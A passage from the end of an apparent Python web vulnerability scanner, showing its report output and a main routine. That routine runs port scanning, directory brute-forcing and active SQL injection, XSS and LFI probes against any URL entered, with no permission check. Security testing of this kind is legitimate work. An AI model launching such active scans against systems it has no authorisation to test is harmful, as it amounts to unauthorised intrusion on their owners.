        print(f" {' '.join(words[i:i+10])}")
    
    print(f"\n {Colors.BOLD}VERDICT:{Colors.RESET}")
    for v in scan_result.verdict: print(f" -> {v}")
    
    print_ascii_table(scan_result.findings)
    
    # Recommendations
    recs = ReportGenerator.generate_recommendations(scan_result)
    if recs:
        print(f"\n {Colors.BOLD}[TOP RECOMMENDATIONS]{Colors.RESET}")
        for r in recs: print(f" {r}")
    
    # Save Report
    data = {
        "target": scan_result.target,
        "risk_score": score,
        "baseline_status": scan_result.baseline_status,
        "executive_summary": exec_summary,
        "recommendations": recs,
        "attack_surface": scan_result.attack_surface,
        "verdict": [re.sub(r'\033\[[0-9;]*m', '', v) for v in scan_result.verdict],
        "findings": [f.to_dict() for f in scan_result.findings]
    }
    with open("report.json", "w") as f: json.dump(data, f, indent=4)
    print(f"\n     {Colors.GREEN}[+] Saved report.json{Colors.RESET}")

# --- Main ---

def get_target_input():
    if len(sys.argv) > 1: return sys.argv[1]
    try: return input(f" {Colors.CYAN}[+] Enter Target URL: {Colors.RESET}").strip()
    except: return None

def main():
    print_banner()
    t = get_target_input()
    if not t: return
    if not t.startswith("http"): t = "https://" + t
    
    res = ScanResult(t)
    parsed = urlparse(t)
    host = parsed.hostname
    port = parsed.port if parsed.port else (443 if parsed.scheme=='https' else 80)
    
    print(f"\n{Colors.YELLOW}[*] Initializing scan for: {t}{Colors.RESET}")
    
    # Init Modules
    port_scan = PortScanner(host, res)
    web_scan = WebScanner(t, res)
    dirs = DirectoryBruteforce(f"{parsed.scheme}://{host}:{port}", res)
    active_sqli = SQLInjectionScanner(t, res)
    active_xss = XSSScanner(t, res)
    active_lfi = LFIScanner(t, res)
    login_chk = LoginLogicModule(t, res)
    cookie_chk = CookieSecurity(t, res)
    version_chk = ServiceVersionAwareness(res)
    risk_eng = RiskCorrelationEngine(res, dirs.get_found_categories())
    base_eng = BaselineEngine(res)
    
    # Execute
    port_scan.scan()
    if parsed.scheme == "https" or port == 443: SSLAnalyzer(host, port, res).analyze()
    web_scan.check_https_redirect()
    web_scan.check_headers_and_tech()
    version_chk.check() # Check tech/banners from previous steps
    RateLimitDetector(t, res).check()
    cookie_chk.check()
    login_chk.check()
    dirs.scan()
    active_sqli.scan()
    active_xss.scan()
    active_lfi.scan()
    
    # Post-Scan Analysis
    risk_eng.analyze()
    KillChainBuilder(res).build() # V2.6 Kill Chain Analysis
    base_eng.compare()
    
    # V2.5 Output Control
    if "--executive" in sys.argv:
        print(f"\n{Colors.BOLD}[INFO] Executive Mode Enabled: Detailed technical findings suppressed.{Colors.RESET}")
    else:
        generate_report(res) # Default full report
        
    if "--executive" in sys.argv:
        # Show only summary
        exec_summary = ReportGenerator.generate_executive_summary(res)
        print(f"\n {Colors.BOLD}[EXECUTIVE SUMMARY]{Colors.RESET}")
        words = exec_summary.split()
        for i in range(0, len(words), 10):
            print(f" {' '.join(words[i:i+10])}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
